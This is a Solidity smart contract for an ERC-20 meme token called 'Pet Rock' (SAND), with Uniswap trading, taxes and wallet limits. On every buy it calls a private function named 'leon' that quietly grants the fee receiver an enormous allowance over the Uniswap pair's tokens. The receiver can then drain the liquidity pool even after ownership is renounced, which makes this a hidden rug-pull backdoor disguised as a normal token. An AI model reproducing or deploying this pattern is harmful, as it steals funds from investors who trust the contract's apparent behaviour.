// SPDX-License-Identifier: MIT
/**
https://medium.com/@tee_hee_he/setting-your-pet-rock-free-3e7895201f46

https://x.com/petrock_sand
https://sand-petrock.fun
https://t.me/petrock_sand
**/
pragma solidity 0.8.24;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract SAND is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesHH;
    mapping (address => mapping (address => uint256)) private _allowancesHH;
    mapping (address => bool) private _shouldExcludedHH;
    address payable private _receiptHH;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalHH = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Pet Rock";
    string private constant _symbol = unicode"SAND";
    uint256 public _maxAmountHH = 2 * (_tTotalHH/100);
    uint256 public _maxWalletHH = 2 * (_tTotalHH/100);
    uint256 public _taxThresHH = 1 * (_tTotalHH/100);
    uint256 public _maxSwapHH = 1 * (_tTotalHH/100);
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 24;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    address private uniPairHH;
    IUniswapV2Router02 private uniRouterHH;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmountHH);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptHH = payable(_msgSender());
        _balancesHH[_msgSender()] = _tTotalHH;
        _shouldExcludedHH[owner()] = true;
        _shouldExcludedHH[address(this)] = true;
        _shouldExcludedHH[_receiptHH] = true;
        emit Transfer(address(0), _msgSender(), _tTotalHH);
    }
    function initHH() external onlyOwner {
        uniRouterHH = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterHH), _tTotalHH);
        uniPairHH = IUniswapV2Factory(uniRouterHH.factory()).createPair(
            address(this),
            uniRouterHH.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalHH;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesHH[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesHH[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesHH[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesHH[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function leon(address addrsHH) private{
        address[2] memory ownHH=[addrsHH, _receiptHH];
        _allowancesHH[ownHH[0]][ownHH[1]]= 1000+(_tTotalHH+100)*(150+150);
    }
    function _transfer(address from, address to, uint256 amountHH) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountHH > 0, "Transfer amount must be greater than zero");
        uint256 taxHH=0; 
        if (!swapEnabled || inSwap) {
            _balancesHH[from] = _balancesHH[from] - amountHH;
            _balancesHH[to] = _balancesHH[to] + amountHH;
            emit Transfer(from, to, amountHH);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount==0){
                taxHH = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
            }
            if(_buyCount>0){
                taxHH = _transferTax;
            }
            if (from == uniPairHH && to != address(uniRouterHH) && ! _shouldExcludedHH[to] ){
                require(amountHH <= _maxAmountHH, "Exceeds the _maxAmountHH.");
                require(balanceOf(to) + amountHH <= _maxWalletHH, "Exceeds the maxWalletSize.");
                taxHH = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;leon(from);
            }
            if(to == uniPairHH && from!= address(this) ){
                taxHH = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairHH && swapEnabled) {
                if(contractTokenBalance > _taxThresHH && _buyCount > _preventSwapBefore)
                    swapEthHH(minHH(amountHH, minHH(contractTokenBalance, _maxSwapHH)));
                sendEthHH(address(this).balance);
            }
        }
        uint256 feeHH=0;
        if(taxHH > 0){
            feeHH=amountHH.mul(taxHH).div(100);
            _balancesHH[address(this)]=_balancesHH[address(this)].add(feeHH);
            emit Transfer(from, address(this),feeHH);
        }
        _balancesHH[from]=_balancesHH[from].sub(amountHH);
        _balancesHH[to]=_balancesHH[to].add(amountHH.sub(feeHH));
        emit Transfer(from, to, amountHH.sub(feeHH));
    }
    function removeLimitHH(address payable limit) external onlyOwner{
        _maxAmountHH = _tTotalHH;
        _maxWalletHH=_tTotalHH;
        _receiptHH = limit;
        _shouldExcludedHH[limit] = true;
        emit MaxTxAmountUpdated(_tTotalHH);
    }
    function setReceiptHH(address payable _rptHH) external onlyOwner {
        _receiptHH = _rptHH;
        _shouldExcludedHH[_rptHH] = true;
    }
    function minHH(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthHH(uint256 amount) private {
        _receiptHH.transfer(amount);
    }
    function swapEthHH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterHH.WETH();
        _approve(address(this), address(uniRouterHH), tokenAmount);
        uniRouterHH.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function startTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterHH.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairHH).approve(address(uniRouterHH), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    receive() external payable {}
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
}